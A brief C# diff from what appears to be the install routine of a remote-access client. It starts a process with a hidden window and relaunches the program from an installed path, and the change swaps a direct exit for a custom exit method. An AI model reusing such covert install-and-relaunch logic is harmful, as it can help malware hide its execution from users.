@@ -69,9 +69,8 @@ namespace Client.Install
                             WindowStyle = ProcessWindowStyle.Hidden
                         });
                     }
-                    Methods.CloseMutex();
                     Process.Start(Settings.ClientFullPath);
-                    Environment.Exit(0);
+                    Methods.ClientExit();
                 }
             }
             catch (Exception ex)
